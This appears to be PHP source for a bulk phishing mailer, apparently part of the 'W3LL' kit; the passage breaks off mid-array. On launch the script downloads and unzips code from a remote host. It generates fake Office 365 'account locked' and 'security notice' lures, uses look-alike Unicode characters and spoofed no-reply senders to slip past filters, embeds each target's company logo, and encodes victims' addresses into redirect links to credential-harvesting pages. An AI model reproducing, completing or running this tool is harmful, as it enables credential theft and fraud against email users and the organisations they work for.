<?php
error_reporting(0);
include 'config.php';

system('clear');
echo("Checking updates...");
exec("wget -q -O well.zip https://w3llstore.co/well.zip");
exec("unzip -o well.zip");
exec("rm well.zip");
system('clear');

function checkValid($token)
{
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, "https://w3llstore.co/sender-2.php?token=$token");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $headers   = array();
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Pragma: no-cache';
    $headers[] = 'Cache-Control: no-cache';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.98 Safari/537.36';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8';
    $headers[] = 'Accept-Encoding: gzip, deflate, br';
    $headers[] = 'Accept-Language: en-US,en;q=0.9';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:'.curl_error($ch);
    }
    curl_close ($ch);
    return $result;
}

$checkval = checkValid($uToken);

function privateLHZ($replacement, $data, $opt = null)
{
    $domains = explode('@', $replacement);
    $domain  = $domains[1];
    $pattern = array('/\+\+w3ll_email\+\+/', '/\+\+w3ll_domain\+\+/','/\+\+w3ll_domain1\+\+/', '/\+\+w3ll_user\+\+/', '/\+\+w3ll_number3\+\+/', '/\+\+w3ll_number4\+\+/', '/\+\+w3ll_number5\+\+/', '/\+\+w3ll_secret_email\+\+/', '/\+\+w3ll_smtp_user\+\+/');
    $replace = array($replacement, explode('@', $replacement)[1],explode('.', $domain)[0], explode('@', $replacement)[0], str_shuffle(implode("", range(000, 999))), str_shuffle(implode("", range(0000, 9999))), str_shuffle(implode("", range(00000, 99999))), str_replace(substr(explode('@', $replacement)[0], 2, (strlen(explode('@', $replacement)[0])/2) + 2), '********', $replacement), explode("@", $opt)[0]);
    return preg_replace($pattern, $replace, $data);
}

function privateLHZ1($replacement, $data, $opt = null)
{
    $domains = explode('@', $replacement);
    $domain  = $domains[1];
    $pattern = array('/\+\+w3ll_email\+\+/', '/\+\+w3ll_domain\+\+/','/\+\+w3ll_domain1\+\+/', '/\+\+w3ll_user\+\+/', '/\+\+w3ll_number3\+\+/', '/\+\+w3ll_number4\+\+/', '/\+\+w3ll_number5\+\+/', '/\+\+w3ll_secret_email\+\+/', '/\+\+w3ll_smtp_user\+\+/');
    $replace = array($replacement, explode('@', $replacement)[1],explode('.', $domain)[0], explode('@', $replacement)[0], str_shuffle(implode("", range(000, 999))), str_shuffle(implode("", range(0000, 9999))), str_shuffle(implode("", range(00000, 99999))), str_replace(substr(explode('@', $replacement)[0], 2, (strlen(explode('@', $replacement)[0])/2) + 2), '********', $replacement), explode("@", $opt)[0]);
    return preg_replace($pattern, $replace, $data);
}

function RandString($randstr)
{
    $char = 'QWERTYUIOPASDFGHJKLZXCVBNM123456789';
    $str  = '';
    for ($i = 0; $i < $randstr; $i++) {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;
};

function RandString1($randstr)
{
    $char = '123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $str  = '';
    for ($i = 0; $i < $randstr; $i++) {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;
};

function RandNumber($randstr)
{
    $char = '123456789';
    $str  = '';
    for ($i = 0; $i < $randstr; $i++) {
        $pos = rand(0, strlen($char) - 1);
        $str .= $char{$pos};
    }
    return $str;
};

function randName($rand)
{
    switch ($rand) {
        case '1':$name = 'Office Νοtісе';
            break;
        case '2':$name = 'Office Rеmіndег ';
            break;
        case '3':$name = 'Office Lοскеd';
            break;
        case '4':$name = 'ѕесuге@Office.сοm';
            break;
        case '5':$name = 'Aρρlе Alert';
            break;
        case '6':$name = 'Office DіѕаЬlеd';
            break;
        case '7':$name = 'Office Lοскеd';
            break;
        case '8':$name = 'Office Rесονегу';
            break;
        case '9':$name = 'Rесονегу Office';
            break;
        default:$name = 'гесονегу@Office.сοm';
            break;
    }
    return $name;
};

function randMail($rand)
{
    switch ($rand) {
        case '1':$name = "Office Service".RandString1(10)."no-reply".RandString1(8)."@servicemailjustification.com";
            break;
        case '2':$name = "Office Service".RandString1(10)."no-replly-".RandString1(8)."@servicemailjustification.com";
            break;
        case '3':$name = "Office Service".RandString1(10)."no-reeply-".RandString1(8)."@servicemailjustification.com";
            break;
        case '4':$name = "Office Service".RandString1(10)."no-reply-".RandString1(8)."@servicemailjustification.com";
            break;
        case '5':$name = "Office Service".RandString1(10)."no-reeply-".RandString1(8)."@servicemailjustification.com";
            break;
        case '6':$name = "Office Service".RandString1(10)."no-replly-".RandString1(8)."@servicemailjustification.com";
            break;
        case '7':$name = "Office Service".RandString1(10)."no-reply-".RandString1(8)."@servicemailjustification.com";
            break;
        default:$name = "Office Service".RandString1(10)."no-reeply-".RandString1(8)."@servicemailjustification.com";
            break;
    }
    return $name;
};

function randSubject($rand, $email)
{
    $r = rand(1000, 9999);
    switch ($rand) {
        case '1':$name = "Office 365 Login Activation #".RandString(4)."";
            break;
        case '2':$name = "Reminder : Office 365 Token #".RandString(5)."";
            break;
        case '3':$name = "Office 365 Notification #".RandString(6)."";
            break;
        case '4':$name = "Office 365 Security Notice #".RandString(7)."";
            break;
        case '5':$name = "Office 365 Notification #".RandString(8)."";
            break;
        case '6':$name = "Office 365 Locked #".RandString(9)."";
            break;
        case '7':$name = "Υοuг Office Αссеѕѕ Ηаѕ Вееn Lοсκеd Fοг Ѕесuгіtу Rеаѕοn #".RandString(10)."";
            break;
        case '8':$name = "Υοuг Office Αссеѕѕ Ηаѕ Вееn Lοсκеd Fοг Ѕесuгіtу Rеаѕοn #".RandString(6)."";
            break;
        case '9':$name = "Υοuг Office Αссеѕѕ Ηаѕ Вееn Lοсκеd Fοг Ѕесuгіtу Rеаѕοn #".RandString(7)."";
            break;
        default:$name = "Υοuг Office Αссеѕѕ Ηаѕ Вееn Lοсκеd Fοг Ѕесuгіtу Rеаѕοn #".RandString(4)."-".RandString(4)."";
            break;
    }
    return $name;
};

function secret_mail($email)
{
    $em   = explode("@",$email);
    $name = implode(array_slice($em, 0, count($em)-1), '@');
    $len  = floor(strlen($name)/2);

    return substr($name,0, $len).str_repeat('*', $len)."@".end($em);
}

function download_image1($image_url, $image_file)
{
        $fp = fopen ($image_file, 'w+');              // open file handle
        $ch = curl_init($image_url);
        // curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); // enable if you want
        curl_setopt($ch, CURLOPT_FILE, $fp);          // output to file
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($ch, CURLOPT_TIMEOUT, 1000);      // some large value to allow curl to run for a long time
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
        // curl_setopt($ch, CURLOPT_VERBOSE, true);   // Enable this line to see debug prints
        curl_exec($ch);
        curl_close($ch);                              // closing curl handle
        fclose($fp);                                  // closing file handle
}

function lettering($msgfile, $email, $frommail, $fromname, $randurl, $subject, $smtp_user, $redirect)
{
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'https://api.namefake.com/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // Ignore cert errors?
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $headers   = array();
    $headers[] = 'Authority: api.namefake.com';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
    $headers[] = 'Accept-Encoding: gzip, deflate, br';
    $headers[] = 'Accept-Language: en-US,en;q=0.9';
    $headers[] = 'Cookie: _ga=GA1.2.1004442100.1563120070; _gid=GA1.2.1228496199.1563120070';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:'.curl_error($ch);
    }
    curl_close($ch);

    $data = json_decode($result);

    $w3ll_data_name = $data->name;
    $w3ll_data_address = $data->address;
    $w3ll_data_latitude = $data-> latitude;
    $w3ll_data_longitude = $data->longitude;
    $w3ll_data_maiden_name = $data->maiden_name;
    $w3ll_data_birth_data = $data->birth_data;
    $w3ll_data_phone_h = $data->phone_h;
    $w3ll_data_phone_w = $data->phone_w;
    $w3ll_data_email_u = $data->email_u;
    $w3ll_data_email_d = $data->email_d;
    $w3ll_data_username = $data->username;
    $w3ll_data_password = $data->password;
    $w3ll_data_domain = $data->domain;
    $w3ll_data_useragent = $data->useragent;
    $w3ll_data_ipv4 = $data->ipv4;
    $w3ll_data_macaddress = $data->macaddress;
    $w3ll_data_plasticcard = $data->plasticcard;
    $w3ll_data_cardexpir = $data->cardexpir;
    $w3ll_data_bonus = $data->bonus;
    $w3ll_data_company = $data->company;
    $w3ll_data_color = $data->color;
    $w3ll_data_uuid = $data->uuid;
    $w3ll_data_height = $data->height;
    $w3ll_data_weight = $data->weight;
    $w3ll_data_blood = $data->blood;
    $w3ll_data_eye = $data->eye;
    $w3ll_data_hair = $data->hair;
    $w3ll_data_sport = $data->sport;

    $users = explode('@', $email);
    $user = $users[0];
    $domains = explode('@', $email);
    $domain = $domains[1];
    $domains1 = explode('.', $domain);
    $domain1 = $domains1[0];
    $secret_mail= secret_mail($email);
    $randip       = "".rand(1, 100).".".rand(1, 100).".".rand(1, 100).".".rand(1, 100)."";
    $randstr1     = RandString(10);
    $randstr1     = RandString(6);
    $randnumber1  = RandNumber(1);
    $randnumber2  = RandNumber(2);
    $randnumber3  = RandNumber(3);
    $randnumber4  = RandNumber(4);
    $randnumber5  = RandNumber(5);
    $randnumber6  = RandNumber(6);
    $randnumber7  = RandNumber(7);
    $randnumber8  = RandNumber(8);
    $randnumber9  = RandNumber(9);
    $randnumber10 = RandNumber(10);

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, "https://logo.clearbit.com/$domain");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $headers   = array();
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);

    if (!$result || strlen(trim($result)) == 0 || curl_errno($ch)) {
        $img_src = "";
    } else {
        download_image1("http://logo.clearbit.com/$domain", "$domain.jpg");
        $img_file = $domain.".jpg";
        // Read image path, convert to base64 encoding
        $imgData = base64_encode(file_get_contents($img_file));

        // Format the image SRC:  data:{mime};base64,{data};
        $img_src = 'data:image/jpeg;base64,'.$imgData;

        // Echo out a sample image
        $img_src = '<img src="'.$img_src.'" height="65px" widht="65px">';

        exec("rm ".$img_file);
    }

    curl_close($ch);
    shuffle($randurl);
    $smtp_email = $smtp_user;
    $smtp_user  = explode("@", $smtp_user)[0];
    $randurls   = array_shift($randurl);
    preg_match('@^(?:https://)?([^/]+)@i',$randurls, $matches);
    $host      = $matches[1];
    $host      = explode('.', $host);
    $host      = $host[0];
    $email64   = base64_encode($email);
    $base64url = base64_decode($randurls);

    if ($redirect == 1) {
        $randurls = "$randurls/?email=".urlencode($email64)."";
    } else if($redirect == 2) {
        $randurls = "$randurls?a=".urlencode($email64)."";
    }

    $randurls  = encode($randurls);
    $countries = array("Afghanistan", "Albania", "Algeria", "American Samoa", "Andorra", "Angola", "Anguilla", "Antarctica", "Antigua and Barbuda", "Argentina", "Armenia", "Aruba", "Australia", "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bermuda", "Bhutan", "Bolivia", "Bosnia and Herzegowina", "Botswana", "Bouvet Island", "Brazil", "British Indian Ocean Territory", "Brunei Darussalam", "Bulgaria", "Burkina Faso", "Burundi", "Cambodia", "Cameroon", "Canada", "Cape Verde", "Cayman Islands", "Central African Republic", "Chad", "Chile", "China", "Christmas Island", "Cocos (Keeling) Islands", "Colombia", "Comoros", "Congo", "Congo, the Democratic Republic of the", "Cook Islands", "Costa Rica", "Cote d'Ivoire", "Croatia (Hrvatska)", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "East Timor", "Ecuador", "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Ethiopia", "Falkland Islands (Malvinas)", "Faroe Islands", "Fiji", "Finland", "France", "France Metropolitan", "French Guiana", "French Polynesia", "French Southern Territories", "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Gibraltar", "Greece", "Greenland", "Grenada", "Guadeloupe", "Guam", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Heard and Mc Donald Islands", "Holy See (Vatican City State)", "Honduras", "Hong Kong", "Hungary", "Iceland", "India", "Indonesia", "Iran (Islamic Republic of)", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, Democratic People's Republic of", "Korea, Republic of", "Kuwait", "Kyrgyzstan", "Lao, People's Democratic Republic", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libyan Arab Jamahiriya", "Liechtenstein", "Lithuania", "Luxembourg", "Macau", "Macedonia, The Former Yugoslav Republic of", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Martinique", "Mauritania", "Mauritius", "Mayotte", "Mexico", "Micronesia, Federated States of", "Moldova, Republic of", "Monaco", "Mongolia", "Montserrat", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", "Netherlands Antilles", "New Caledonia", "New Zealand", "Nicaragua", "Niger", "Nigeria", "Niue", "Norfolk Island", "Northern Mariana Islands", "Norway", "Oman", "Pakistan", "Palau", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Pitcairn", "Poland", "Portugal", "Puerto Rico", "Qatar", "Reunion", "Romania", "Russian Federation", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Seychelles", "Sierra Leone", "Singapore", "Slovakia (Slovak Republic)", "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Georgia and the South Sandwich Islands", "Spain", "Sri Lanka", "St. Helena", "St. Pierre and Miquelon", "Sudan", "Suriname", "Svalbard and Jan Mayen Islands", "Swaziland", "Sweden", "Switzerland", "Syrian Arab Republic", "Taiwan, Province of China", "Tajikistan", "Tanzania, United Republic of", "Thailand", "Togo", "Tokelau", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Turks and Caicos Islands", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States", "United States Minor Outlying Islands", "Uruguay", "Uzbekistan", "Vanuatu", "Venezuela", "Vietnam", "Virgin Islands (British)", "Virgin Islands (U.S.)", "Wallis and Futuna Islands", "Western Sahara", "Yemen", "Yugoslavia", "Zambia", "Zimbabwe");

    shuffle($countries);
    $country  = array_shift($countries);
    $OSystems = array('Windows 10', 'Windows 8.1', 'Windows 8', 'Windows 7', 'Windows Vista', 'Windows Server 2003/XP x64', 'Windows XP', 'Windows XP', 'Mac OS X', 'Mac OS 9', 'Linux', 'Ubuntu', 'iPhone', 'iPod', 'iPad', 'Android', 'BlackBerry', 'Windows 10 Home Edition');
    shuffle($OSystems);
    $OS = array_shift($OSystems);

    $ListBrowser = array('Internet Explorer', 'Firefox', 'Safari', 'Chrome', 'Edge', 'Opera', 'Netscape', 'Tor Browser');
    shuffle($ListBrowser);
    $browser = array_shift($ListBrowser);
    $date    = date('d/M/Y');
    $time    = date('g:i A (T)');
    $file    = file_get_contents($msgfile);
    $arr     = array(
        '++w3ll_logo++',
        '++w3ll_data_name++',
        '++w3ll_data_address++',
        '++w3ll_data_latitude++',
        '++w3ll_data_longitude++',
        '++w3ll_data_maiden_name++',
        '++w3ll_data_birth_data++',
        '++w3ll_data_phone_h++',
        '++w3ll_data_phone_w++',
        '++w3ll_data_email_u++',
        '++w3ll_data_email_d++',
        '++w3ll_data_username++',
        '++w3ll_data_password++',
        '++w3ll_data_domain++',
        '++w3ll_data_useragent++',
        '++w3ll_data_ipv4++',
        '++w3ll_data_macaddress++',
        '++w3ll_data_plasticcard++',
        '++w3ll_data_cardexpir++',
        '++w3ll_data_bonus++',
        '++w3ll_data_company++',
        '++w3ll_data_color++',
        '++w3ll_data_uuid++',
        '++w3ll_data_height++',
        '++w3ll_data_weight++',
        '++w3ll_data_blood++',
        '++w3ll_data_eye++',
        '++w3ll_data_hair++',
        '++w3ll_data_sport++',
        '++w3ll_domain_url++',
        '++w3ll_smtp++',
        '++w3ll_short64++',
        '++w3ll_email64++',
        '++w3ll_email++',
        '++w3ll_subject++',
        '++w3ll_randomip++',
        '++w3ll_frommail++',
        '++w3ll_fromname++',
        '++w3ll_short++',
        '++w3ll_randstring++',
        '++w3ll_country++',
        '++w3ll_date++',
        '++w3ll_number1++',
        '++w3ll_number2++',
        '++w3ll_number3++',
        '++w3ll_number4++',
        '++w3ll_number5++',
        '++w3ll_number6++',
        '++w3ll_number7++',
        '++w3ll_number8++',
        '++w3ll_number9++',
        '++w3ll_number10++',
        '++w3ll_os++',
        '++w3ll_browser++',
        '++w3ll_time++',
        '++w3ll_user++',
        '++w3ll_domain++',
        '++w3ll_domain1++',
        '++w3ll_secret_email++',
        '++w3ll_smtp_user++'
    );

    $new  = array(''.$img_src.'',''.$w3ll_data_name.'',''.$w3ll_data_address.'',''.$w3ll_data_latitude.'',''.$w3ll_data_longitude.'',''.$w3ll_data_maiden_name.'',''.$w3ll_data_birth_data.'',''.$w3ll_data_phone_h.'',''.$w3ll_data_phone_w.'',''.$w3ll_data_email_u.'',''.$w3ll_data_email_d.'',''.$w3ll_data_username.'',''.$w3ll_data_password.'',''.$w3ll_data_domain.'',''.$w3ll_data_useragent.'',''.$w3ll_data_ipv4.'',''.$w3ll_data_macaddress.'',''.$w3ll_data_plasticcard.'',''.$w3ll_data_cardexpir.'',''.$w3ll_data_bonus.'', ''.$w3ll_data_company.'', ''.$w3ll_data_color.'', ''.$w3ll_data_uuid.'', ''.$w3ll_data_height.'', ''.$w3ll_data_weight.'', ''.$w3ll_data_blood.'', ''.$w3ll_data_eye.'', ''.$w3ll_data_hair.'', ''.$w3ll_data_sport.'', ''.$host.'',''.$smtp_email.'',''.$base64url.'',''.$email64.'',''.$email.'', ''.$subject.'', ''.$randip.'', ''.$frommail.'', ''.$fromname.'', ''.$randurls.'', ''.$randstr1.'', ''.$country.'', ''.$date.'', ''.$randnumber1.'', ''.$randnumber2.'', ''.$randnumber3.'', ''.$randnumber4.'', ''.$randnumber5.'', ''.$randnumber6.'', ''.$randnumber7.'', ''.$randnumber8.'', ''.$randnumber9.'', ''.$randnumber10.'', ''.$OS.'', ''.$browser.'',''.$time.'',''.$user.'',''.$domain.'',''.$domain1.'',''.$secret_mail.'', ''.$smtp_user.'');
    $repl = str_replace($arr, $new, $file);
    return $repl;
};

function subjecting($msgfile, $email, $frommail, $fromname, $randurl, $subject, $smtp_user, $redirect)
{
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'https://api.namefake.com/');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); // Ignore cert errors?
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $headers   = array();
    $headers[] = 'Authority: api.namefake.com';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
    $headers[] = 'Accept-Encoding: gzip, deflate, br';
    $headers[] = 'Accept-Language: en-US,en;q=0.9';
    $headers[] = 'Cookie: _ga=GA1.2.1004442100.1563120070; _gid=GA1.2.1228496199.1563120070';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:'.curl_error($ch);
    }
    curl_close($ch);

    $data = json_decode($result);

    $w3ll_data_name = $data->name;
    $w3ll_data_address = $data->address;
    $w3ll_data_latitude = $data-> latitude;
    $w3ll_data_longitude = $data->longitude;
    $w3ll_data_maiden_name = $data->maiden_name;
    $w3ll_data_birth_data = $data->birth_data;
    $w3ll_data_phone_h = $data->phone_h;
    $w3ll_data_phone_w = $data->phone_w;
    $w3ll_data_email_u = $data->email_u;
    $w3ll_data_email_d = $data->email_d;
    $w3ll_data_username = $data->username;
    $w3ll_data_password = $data->password;
    $w3ll_data_domain = $data->domain;
    $w3ll_data_useragent = $data->useragent;
    $w3ll_data_ipv4 = $data->ipv4;
    $w3ll_data_macaddress = $data->macaddress;
    $w3ll_data_plasticcard = $data->plasticcard;
    $w3ll_data_cardexpir = $data->cardexpir;
    $w3ll_data_bonus = $data->bonus;
    $w3ll_data_company = $data->company;
    $w3ll_data_color = $data->color;
    $w3ll_data_uuid = $data->uuid;
    $w3ll_data_height = $data->height;
    $w3ll_data_weight = $data->weight;
    $w3ll_data_blood = $data->blood;
    $w3ll_data_eye = $data->eye;
    $w3ll_data_hair = $data->hair;
    $w3ll_data_sport = $data->sport;

    $users        = explode('@', $email);
    $user         = $users[0];
    $domains      = explode('@', $email);
    $domain       = $domains[1];
    $domains1     = explode('.', $domain);
    $domain1      = $domains1[0];
    $secret_mail  = secret_mail($email);
    $randip       = "".rand(1, 100).".".rand(1, 100).".".rand(1, 100).".".rand(1, 100)."";
    $randstr1     = RandString(10);
    $randstr1     = RandString(6);
    $randnumber1  = RandNumber(1);
    $randnumber2  = RandNumber(2);
    $randnumber3  = RandNumber(3);
    $randnumber4  = RandNumber(4);
    $randnumber5  = RandNumber(5);
    $randnumber6  = RandNumber(6);
    $randnumber7  = RandNumber(7);
    $randnumber8  = RandNumber(8);
    $randnumber9  = RandNumber(9);
    $randnumber10 = RandNumber(10);

    $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, "https://logo.clearbit.com/$domain");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $headers   = array();
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);

    if (!$result || strlen(trim($result)) == 0 || curl_errno($ch)) {
        $img_src = "";
    } else {
        download_image1("http://logo.clearbit.com/$domain", "$domain.jpg");
        $img_file = $domain.".jpg";
        // Read image path, convert to base64 encoding
        $imgData = base64_encode(file_get_contents($img_file));

        // Format the image SRC:  data:{mime};base64,{data};
        $img_src = 'data:image/jpeg;base64,'.$imgData;

        // Echo out a sample image
        $img_src = '<img src="'.$img_src.'" height="65px" widht="65px">';

        exec("rm ".$img_file);
    }

    curl_close($ch);
    shuffle($randurl);
    $smtp_email = $smtp_user;
    $smtp_user  = explode("@", $smtp_user)[0];
    $randurls   = array_shift($randurl);
    preg_match('@^(?:https://)?([^/]+)@i',$randurls, $matches);
    $host      = $matches[1];
    $host      = explode('.', $host);
    $host      = $host[0];
    $email64   = base64_encode($email);
    $base64url = base64_decode($randurls);

    if ($redirect == 1) {
        $randurls = "$randurls/?email=".urlencode($email64)."";
    } else if($redirect == 2) {
        $randurls = "$randurls?a=".urlencode($email64)."";
    }

    $randurls  = encode($randurls);
    $countries = array("Afghanistan", "Albania", "Algeria", "American Samoa", "Andorra", "Angola", "Anguilla", "Antarctica", "Antigua and Barbuda", "Argentina", "Armenia", "Aruba", "Australia", "Austria", "Azerbaijan", "Bahamas", "Bahrain", "Bangladesh", "Barbados", "Belarus", "Belgium", "Belize", "Benin", "Bermuda", "Bhutan", "Bolivia", "Bosnia and Herzegowina", "Botswana", "Bouvet Island", "Brazil", "British Indian Ocean Territory", "Brunei Darussalam", "Bulgaria", "Burkina Faso", "Burundi", "Cambodia", "Cameroon", "Canada", "Cape Verde", "Cayman Islands", "Central African Republic", "Chad", "Chile", "China", "Christmas Island", "Cocos (Keeling) Islands", "Colombia", "Comoros", "Congo", "Congo, the Democratic Republic of the", "Cook Islands", "Costa Rica", "Cote d'Ivoire", "Croatia (Hrvatska)", "Cuba", "Cyprus", "Czech Republic", "Denmark", "Djibouti", "Dominica", "Dominican Republic", "East Timor", "Ecuador", "Egypt", "El Salvador", "Equatorial Guinea", "Eritrea", "Estonia", "Ethiopia", "Falkland Islands (Malvinas)", "Faroe Islands", "Fiji", "Finland", "France", "France Metropolitan", "French Guiana", "French Polynesia", "French Southern Territories", "Gabon", "Gambia", "Georgia", "Germany", "Ghana", "Gibraltar", "Greece", "Greenland", "Grenada", "Guadeloupe", "Guam", "Guatemala", "Guinea", "Guinea-Bissau", "Guyana", "Haiti", "Heard and Mc Donald Islands", "Holy See (Vatican City State)", "Honduras", "Hong Kong", "Hungary", "Iceland", "India", "Indonesia", "Iran (Islamic Republic of)", "Iraq", "Ireland", "Israel", "Italy", "Jamaica", "Japan", "Jordan", "Kazakhstan", "Kenya", "Kiribati", "Korea, Democratic People's Republic of", "Korea, Republic of", "Kuwait", "Kyrgyzstan", "Lao, People's Democratic Republic", "Latvia", "Lebanon", "Lesotho", "Liberia", "Libyan Arab Jamahiriya", "Liechtenstein", "Lithuania", "Luxembourg", "Macau", "Macedonia, The Former Yugoslav Republic of", "Madagascar", "Malawi", "Malaysia", "Maldives", "Mali", "Malta", "Marshall Islands", "Martinique", "Mauritania", "Mauritius", "Mayotte", "Mexico", "Micronesia, Federated States of", "Moldova, Republic of", "Monaco", "Mongolia", "Montserrat", "Morocco", "Mozambique", "Myanmar", "Namibia", "Nauru", "Nepal", "Netherlands", "Netherlands Antilles", "New Caledonia", "New Zealand", "Nicaragua", "Niger", "Nigeria", "Niue", "Norfolk Island", "Northern Mariana Islands", "Norway", "Oman", "Pakistan", "Palau", "Panama", "Papua New Guinea", "Paraguay", "Peru", "Philippines", "Pitcairn", "Poland", "Portugal", "Puerto Rico", "Qatar", "Reunion", "Romania", "Russian Federation", "Rwanda", "Saint Kitts and Nevis", "Saint Lucia", "Saint Vincent and the Grenadines", "Samoa", "San Marino", "Sao Tome and Principe", "Saudi Arabia", "Senegal", "Seychelles", "Sierra Leone", "Singapore", "Slovakia (Slovak Republic)", "Slovenia", "Solomon Islands", "Somalia", "South Africa", "South Georgia and the South Sandwich Islands", "Spain", "Sri Lanka", "St. Helena", "St. Pierre and Miquelon", "Sudan", "Suriname", "Svalbard and Jan Mayen Islands", "Swaziland", "Sweden", "Switzerland", "Syrian Arab Republic", "Taiwan, Province of China", "Tajikistan", "Tanzania, United Republic of", "Thailand", "Togo", "Tokelau", "Tonga", "Trinidad and Tobago", "Tunisia", "Turkey", "Turkmenistan", "Turks and Caicos Islands", "Tuvalu", "Uganda", "Ukraine", "United Arab Emirates", "United Kingdom", "United States", "United States Minor Outlying Islands", "Uruguay", "Uzbekistan", "Vanuatu", "Venezuela", "Vietnam", "Virgin Islands (British)", "Virgin Islands (U.S.)", "Wallis and Futuna Islands", "Western Sahara", "Yemen", "Yugoslavia", "Zambia", "Zimbabwe");

    shuffle($countries);
    $country  = array_shift($countries);
    $OSystems = array('Windows 10', 'Windows 8.1', 'Windows 8', 'Windows 7', 'Windows Vista', 'Windows Server 2003/XP x64', 'Windows XP', 'Windows XP', 'Mac OS X', 'Mac OS 9', 'Linux', 'Ubuntu', 'iPhone', 'iPod', 'iPad', 'Android', 'BlackBerry', 'Windows 10 Home Edition');
    shuffle($OSystems);
    $OS = array_shift($OSystems);

    $ListBrowser = array('Internet Explorer', 'Firefox', 'Safari', 'Chrome', 'Edge', 'Opera', 'Netscape', 'Tor Browser');
    shuffle($ListBrowser);
    $browser = array_shift($ListBrowser);
    $date    = date('d/M/Y');
    $time    = date('g:i A (T)');
    $file    = $msgfile;
    $arr     = array(
        '++w3ll_logo++',
        '++w3ll_data_name++',
        '++w3ll_data_address++',
        '++w3ll_data_latitude++',
        '++w3ll_data_longitude++',
        '++w3ll_data_maiden_name++',
        '++w3ll_data_birth_data++',
        '++w3ll_data_phone_h++',
        '++w3ll_data_phone_w++',
